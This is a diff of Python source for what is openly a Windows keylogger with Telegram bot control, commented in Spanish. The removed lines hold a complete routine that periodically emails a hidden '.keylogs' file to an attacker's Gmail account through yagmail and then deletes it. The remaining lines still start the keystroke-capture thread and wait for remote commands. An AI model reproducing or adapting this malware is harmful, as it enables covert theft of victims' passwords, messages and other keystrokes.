@@ -637,52 +637,6 @@ def handle(msg):
             for resp in responses:
                 send_safe_message(bot, chat_id, resp)
 
-def VerificarConexion():
-    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)         # Creamos el socket de conexion
-    try:                                                            # Intenta conectarse al servidor de Google
-        con.connect(('www.google.com', 80))
-        con.close()
-        return True
-    except:
-        return False
-def sendEmail(log, sender_email, sender_password, receiver_email):   # Envía los datos .keylogs vía Gmail 
-    try:
-        mifecha                 = datetime.datetime.now()
-        subject                 = "Data User: "+ str(getuser()) 
-        # Inicia Sesión 
-        yag = yagmail.SMTP(user=sender_email, password=sender_password)
-        informacion = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
-        # Cuerpo del mensaje
-        contents = [ 
-            "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
-        ]
-        yag.send(receiver_email, subject, contents, attachments=log )
-        print("[+] Se envió el correo correctamente")
-        return True;
-    except:
-        print("[-] No se pudo envíar el correo")
-        return False
-def SendLog():        
-    while (True):
-        # Gmail Emisor
-        sender_email_P            = "correo1@gmail.com"             # <== Correo de envío principal
-        sender_password_P         = "contraseña1"                   # <== Contraseña de envío principal
-        sender_email_S            = "correo2@gmail.com"             # <== Correo de envío principal     <== (Solo en caso de que el correo principal falle)
-        sender_password_S         = "contraseña2"                   # <== Contraseña de envío principal <== (Solo en caso de que el correo principal falle)
-        # Email Receptor
-        receiver_email          = ["micorreo1@gmail.com"]                                   # <== 1 Remitente (Es el correo que recibirá el keylogg)
-       #receiver_email          = ["micorreo1@gmail.com", "micorreo2.5648@hotmail.com"]     # <== 2 Remitentes (Estos son los correos a los cuales le llegará el keylogger)
-       
-        for x in range(730): 
-            time.sleep(10)
-        if VerificarConexion(): 
-            homedir = "C:\\Users\\"+str(getuser())+"\\AppData\\Roaming\\Microsoft\\.keylogs"
-            if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):
-                os.remove(homedir)
-            elif sendEmail(homedir, sender_email_S, sender_password_S , receiver_email):
-                os.remove(homedir)
-        else:
-            pass
 def KeyConMin(argument):                # Caracteres Comunes // Optimizados
     switcher = {
         # Vocales Miniscula
@@ -881,9 +835,7 @@ cd.log('s', 'Iniciando Hilo de Keylogger')
 cd.log('i', 'Keylogger iniciado')
 
 p1 = threading.Thread(target=Klogger)   # Keylogger 
-p2 = threading.Thread(target=SendLog)   # Envía keylogger por correo
-p2.start()  # Inicia hilo de keylogger
-p1.start()  # Inicia hilo de envío de correo
+p1.start()  # Inicia hilo keylogger
 cd.log('s', 'Todo se ejecutó con exito\n')
 cd.log('i', 'Esperando comandos ==>>          ' + platform.uname()[1] + '...\n\n')
 pythoncom.PumpMessages()  # Escucha los comandos
